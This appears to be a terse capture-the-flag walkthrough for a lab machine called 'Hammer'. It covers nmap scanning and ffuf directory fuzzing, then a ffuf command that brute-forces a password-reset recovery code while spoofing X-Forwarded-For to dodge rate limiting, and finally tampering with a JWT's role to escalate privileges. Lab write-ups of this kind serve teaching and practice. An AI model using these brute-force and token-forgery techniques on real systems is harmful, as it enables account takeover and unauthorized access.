# Hammer 

![alt text](/P/Hammer.png)

At First scan with nmap 

```cmd
nmap -sV -sC -p <ip address> 
```

![alt text](/P/hammer1.png)

search

```cmd
http://ip address:1337
```

![alt text](/P/hammer2.png)

And then find inspect

![alt text](/P/hammer3.png)

```cmd
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.193.250:1337/hmr_FUZZ
```

![alt text](/P/hammer4.png)

![alt text](/P/hammer5.png)

Click error.logs 

![alt text](/P/hammer6.png)

use burpsuite to get cookieid 

![alt text](/P/hammer7.png)

get cookie and add in ffuf

```cmd
ffuf -w numbers.txt -u "http://10.48.188.218:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=dsvhhedt6n9l643k6ksqfkfcau" -H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s
```
get code

![alt text](/P/hammer8.png)
get Flag 1

![alt text](/P/flag1.png)

login and use burpsuite using typing command

![alt text](/P/hammer9.png)

Find this 

![alt text](/P/hammer10.png)

And go to Jwt Site to convert the token get from burpsuite

![alt text](/P/hammer11.png)

Change payload and role

![alt text](/P/hammer12.png)

Fing the flag

![alt text](/P/hammer13.png)